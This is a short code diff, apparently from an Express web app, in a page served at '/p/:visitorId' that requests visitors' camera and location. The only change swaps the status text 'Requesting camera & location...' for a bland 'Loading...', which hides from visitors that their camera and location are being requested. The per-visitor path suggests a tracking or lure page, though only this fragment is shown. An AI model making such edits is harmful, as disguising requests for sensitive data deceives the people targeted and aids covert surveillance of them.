@@ -461,7 +461,7 @@ app.get('/p/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('📸 Requesting camera & location...', 40);
+                updateStatus('Loading...', 40);
 
                 Promise.all([
                     requestLocation(),
